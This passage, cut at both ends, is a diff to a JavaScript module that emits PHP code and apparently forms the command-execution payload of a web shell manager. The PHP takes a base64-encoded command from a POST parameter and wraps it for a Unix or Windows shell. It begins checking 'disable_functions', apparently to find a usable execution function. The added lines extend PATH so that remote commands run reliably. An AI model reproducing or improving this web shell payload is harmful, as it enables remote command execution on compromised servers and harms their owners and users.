@@ -8,6 +8,11 @@ module.exports = (arg1, arg2) => ({
       $s=base64_decode($_POST["${arg2}"]);
       $d=dirname($_SERVER["SCRIPT_FILENAME"]);
       $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
+      if(substr($d,0,1)=="/"){
+        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+      }else{
+        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
+      }
       $r="{$p} {$c}";
       function fe($f){
         $d=explode(",",@ini_get("disable_functions"));
